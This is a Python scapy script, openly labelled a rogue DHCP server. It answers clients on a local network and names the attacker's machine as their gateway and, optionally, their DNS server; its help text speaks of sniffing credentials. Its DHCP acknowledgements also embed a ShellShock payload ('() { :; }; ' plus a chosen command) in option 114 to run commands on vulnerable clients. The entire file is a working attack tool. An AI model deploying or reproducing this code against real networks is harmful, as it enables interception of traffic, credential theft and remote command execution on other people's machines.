#!/bin/python3

import argparse

import scapy.arch
import scapy.config
import scapy.layers.dhcp
import scapy.layers.inet
import scapy.layers.l2
import scapy.sendrecv


class bcolors:
    HEADER = "\033[95m"
    OKBLUE = "\033[94m"
    OKCYAN = "\033[96m"
    OKGREEN = "\033[92m"
    WARNING = "\033[93m"
    FAIL = "\033[91m"
    ENDC = "\033[0m"
    BOLD = "\033[1m"
    UNDERLINE = "\033[4m"


class DHCPListener:
    """DHCP Listener"""
    # Real router
    __gateway_ip: str
    __gateway_mac: str

    # My DHCP server
    __dhcp_server_ip: str
    __dhcp_mac: str
    __dict_ip_addresses: dict
    __ip_pool: list

    # DHCP configuration
    __fake_dns_server: str
    __fake_subnet_mask: str
    __fake_gateway_ip: str
    __lease_time: int
    __renewal_time: int
    __rebinding_time: int

    # ShellShock
    _command: str

    def __init__(self):
        self.__gateway_ip = scapy.config.conf.route.route("0.0.0.0")[2]

        self.__gateway_mac = "00:00:00:00:00:00"
        self.__gateway_mac = scapy.layers.l2.getmacbyip(self.__gateway_ip)

        self.__dhcp_server_ip = scapy.arch.get_if_addr(scapy.config.conf.iface)
        self.__dhcp_mac = scapy.layers.l2.Ether().src
        self.__dict_ip_addresses = {}
        self.__ip_pool = []

        self.__fake_dns_server = "8.8.8.8"
        self.__fake_subnet_mask = ""
        self.__fake_gateway_ip = self.__dhcp_server_ip
        self.__lease_time = 86400
        self.__renewal_time = 172800
        self.__rebinding_time = 138240

        self.__command = ""

    def set_lease_time(self, lease_time):
        """set_lease_time"""
        self.__lease_time = lease_time

    def set_renewal_time(self, renewal_time):
        """set_renewal_time"""
        self.__renewal_time = renewal_time

    def set_rebinding_time(self, rebinding_time):
        "set_rebinding_time"
        self.__rebinding_time = rebinding_time

    def set_dns(self, dns):
        "set_dns"
        self.__fake_dns_server = dns

    def set_subnet_mask(self, subnetmask):
        "set_subnet_mask"
        self.__fake_subnet_mask = subnetmask

    def set_gateway_ip(self, gateway):
        "set_gateway_ip"
        self.__fake_gateway_ip = gateway

    def set_ip_pool(self, ip_pool):
        "set_ip_pool"
        self.__ip_pool = self.get_ip_pool_by_range(ip_pool)

    def set_command(self, command):
        "set_command"
        self.__command = command

    def get_ip_pool_by_range(self, iprange):
        """Return a list of IP address given a range"""
        return self.return_range(iprange)

    @staticmethod
    def get_ip_range_iterator(iprange):
        """Get IP range iterator"""
        l: list = iprange.split(".")
        l.remove(l[len(l) - 1])
        ip = ""
        for i in l:
            ip += str(i) + "."
        return ip

    def return_range(self, iprange):
        """
        Remove last number of an IP address.
        Ex: For 192.168.0.100 return 192.168.0.
        """
        listIP = iprange.split("-")
        maxIP = self.get_ip_range_iterator(listIP[0])
        listIP[1] = maxIP + listIP[1]
        return self.generate_list(listIP)

    def generate_list(self, listIP):
        """Generate a list of IP addresses"""
        newList = []
        i = int(listIP[0].split(".")[3])
        n = int(listIP[1].split(".")[3])
        index = self.get_ip_range_iterator(listIP[0])

        for x in range(i, n + 1):
            newList.append(index + str(x))

        return newList

    @staticmethod
    def get_option(dhcp_options, key):
        """Decode bytes in option to ascii"""
        must_decode = ["hostname", "domain", "vendor_class_id"]
        try:
            for i in dhcp_options:
                if i[0] == key:
                    # If DHCP Server Returned multiple name servers
                    # return all as comma separated string.
                    if key == "name_server" and len(i) > 2:
                        return ",".join(i[1:])
                    # domain and hostname are binary strings,
                    # decode to unicode string before returning
                    elif key in must_decode:
                        return i[1].decode()
                    else:
                        return i[1]
        except:
            pass

    def generate_packet_server_offer(self, packet_type, ip_client, packet):
        """return a DHCP packet for the client discovery"""
        return (
            scapy.layers.l2.Ether(
                src=self.__dhcp_mac, dst=packet[scapy.layers.l2.Ether].src
            )
            / scapy.layers.inet.IP(src=self.__dhcp_server_ip, dst="255.255.255.255")
            / scapy.layers.inet.UDP(sport=67, dport=68)
            / scapy.layers.dhcp.BOOTP(
                op=2,
                yiaddr=ip_client,
                ciaddr=packet[scapy.layers.inet.IP].src,
                siaddr=self.__dhcp_server_ip,
                chaddr=packet[scapy.layers.l2.Ether].chaddr,
                xid=packet[scapy.layers.dhcp.BOOTP].xid,
            )
            / scapy.layers.dhcp.DHCP(
                options=[
                    ("server_id", self.__dhcp_server_ip),
                    ("lease_time", self.__lease_time),
                    ("renewal_time", self.__renewal_time),
                    ("rebinding_time", self.__rebinding_time),
                    ("subnet_mask", self.__fake_subnet_mask),
                    ("router", self.__fake_gateway_ip),
                    ("message-type", packet_type),
                    ("name_server", self.__fake_dns_server),
                    "end",
                ]
            )
        )

    def generate_packet_server_ack(self, packet_type, ip_client, packet):
        """return a DHCP packet for the client request"""
        return (
            scapy.layers.l2.Ether(
                src=self.__dhcp_mac, dst=packet[scapy.layers.l2.Ether].src
            )
            / scapy.layers.inet.IP(src=self.__dhcp_server_ip, dst="255.255.255.255")
            / scapy.layers.inet.UDP(sport=67, dport=68)
            / scapy.layers.dhcp.BOOTP(
                op=2,
                yiaddr=ip_client,
                ciaddr=packet[scapy.layers.inet.IP].src,
                siaddr=self.__dhcp_server_ip,
                chaddr=packet[scapy.layers.l2.Ether].chaddr,
                xid=packet[scapy.layers.dhcp.BOOTP].xid,
            )
            / scapy.layers.dhcp.DHCP(
                options=[
                    ("server_id", self.__dhcp_server_ip),
                    ("lease_time", self.__lease_time),
                    ("renewal_time", self.__renewal_time),
                    ("rebinding_time", self.__rebinding_time),
                    ("subnet_mask", self.__fake_subnet_mask),
                    ("router", self.__fake_gateway_ip),
                    ("message-type", packet_type),
                    ("name_server", self.__fake_dns_server),
                    (114, b"() { :; }; " + self.__command.encode()),
                    "end",
                ]
            )
        )

    def listener(self, packet):
        """Listening to DHCP packet"""
        # DHCP discover
        if (
            scapy.layers.dhcp.DHCP in packet
            and packet[scapy.layers.dhcp.DHCP].options[0][1] == 1
        ):
            # send DHCP offer
            if len(self.__ip_pool) > 0:
                ip_client = self.__ip_pool.pop()
                offer = self.generate_packet_server_offer("offer", ip_client, packet)
                scapy.sendrecv.sendp(offer)

            print(f"{bcolors.OKBLUE}---New DHCP Discover---{bcolors.ENDC}")
            hostname = self.get_option(
                packet[scapy.layers.dhcp.DHCP].options, "hostname"
            )
            print(
                f"{bcolors.FAIL}[*]{bcolors.ENDC} "
                f"Host {bcolors.WARNING}{hostname}{bcolors.ENDC} "
                f"({bcolors.WARNING}{packet[scapy.layers.l2.Ether].src}"
                f"{bcolors.ENDC}) asked for an IP\n"
            )

        # DHCP request
        if (
            scapy.layers.dhcp.DHCP in packet
            and packet[scapy.layers.dhcp.DHCP].options[0][1] == 3
        ):
            # send DHCP ack
            requested_ip = self.get_option(
                packet[scapy.layers.dhcp.DHCP].options, "requested_addr"
            )
            ack = self.generate_packet_server_ack("ack", requested_ip, packet)
            scapy.sendrecv.sendp(ack)

            print(f"{bcolors.OKBLUE}---New DHCP Request---{bcolors.ENDC}")
            hostname = self.get_option(
                packet[scapy.layers.dhcp.DHCP].options, "hostname"
            )
            print(
                f"{bcolors.FAIL}[*]{bcolors.ENDC} "
                f"Device {bcolors.WARNING}{hostname}{bcolors.ENDC} "
                f"({bcolors.WARNING}{packet[scapy.layers.l2.Ether].src}"
                f"{bcolors.ENDC}){bcolors.ENDC} "
                f"requested {bcolors.WARNING}{requested_ip}\n"
            )
            self.__dict_ip_addresses[requested_ip] = packet[scapy.layers.l2.Ether].src
            print(f"{bcolors.ENDC}")


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="This script is a DHCP rogue server.")
    parser.add_argument("-i", "--interface", required=False)
    parser.add_argument("-d", "--dns", required=False, help="DNS IP")
    parser.add_argument("-m", "--netmask", required=True)
    parser.add_argument(
        "-g",
        "--gateway",
        required=False,
        help="Gateway IP for your attack (the IP in which you are going to sniff credentials). "
        "Default is the same IP"
        " that your DHCP server",
    )
    parser.add_argument(
        "-x", "--iprange", required=False, help="Range IP Ex: 192.168.0.1-45 "
    )
    parser.add_argument("-l", "--lease_time", required=False)
    parser.add_argument("-r", "--renewal_time", required=False)
    parser.add_argument("-b", "--rebinding_time", required=False)
    parser.add_argument("-c", "--command", required=False)
    args = parser.parse_args()

    DHCPListener = DHCPListener()
    if args.dns is not None:
        DHCPListener.set_dns(args.dns)

    if args.gateway is not None:
        DHCPListener.set_gateway_ip(args.gateway)

    DHCPListener.set_subnet_mask(args.netmask)

    if args.iprange is not None:
        DHCPListener.set_ip_pool(args.iprange)

    if args.lease_time is not None:
        DHCPListener.set_lease_time(args.lease_time)

    if args.renewal_time is not None:
        DHCPListener.set_renewal_time(args.renewal_time)

    if args.rebinding_time is not None:
        DHCPListener.set_rebinding_time(args.rebinding_time)

    if args.command is not None:
        DHCPListener.set_command(args.command)

    print("DHCP server in listening...")
    if args.interface is None:
        scapy.sendrecv.sniff(filter="udp and port 67", prn=DHCPListener.listener)
    else:
        scapy.sendrecv.sniff(
            iface=args.interface, filter="udp and port 67", prn=DHCPListener.listener
        )
